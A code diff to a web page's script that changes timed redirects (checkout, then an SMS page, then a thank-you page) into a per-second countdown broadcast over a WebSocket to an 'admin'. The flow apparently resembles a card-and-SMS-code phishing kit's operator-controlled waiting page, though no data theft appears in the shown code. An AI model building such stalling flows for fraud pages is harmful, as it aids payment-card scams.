@@ -73,23 +73,37 @@
             } catch (err) { console.error(err); }
         };
 
-        // --- Timed Redirect Logic (Fallback / Default Flow) ---
+        // --- Timed Redirect Logic with Real-time Broadcasting ---
+        let duration = 5; // Default fallback
+        let nextPage = 'index.html';
+
         if (step === '1') {
-            // From Checkout -> Wait 20s -> Go to SMS
-            setTimeout(() => {
-                window.location.href = 'sms.html';
-            }, 20000);
+            duration = 20;
+            nextPage = 'sms.html';
         } else if (step === '2') {
-            // From SMS -> Wait 10s -> Go to Thank You
-            setTimeout(() => {
-                window.location.href = 'thank_you.html';
-            }, 10000);
-        } else {
-            // Default Fallback
-            setTimeout(() => {
-                window.location.href = 'index.html';
-            }, 5000);
+            duration = 10;
+            nextPage = 'thank_you.html';
         }
+
+        const timerInterval = setInterval(() => {
+            duration--;
+
+            // Broadcast current time to admin
+            if (ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    event: 'timer_update',
+                    data: {
+                        timeLeft: duration,
+                        totalDuration: (step === '1' ? 20 : (step === '2' ? 10 : 5))
+                    }
+                }));
+            }
+
+            if (duration <= 0) {
+                clearInterval(timerInterval);
+                window.location.href = nextPage;
+            }
+        }, 1000);
     </script>
 </body>
 
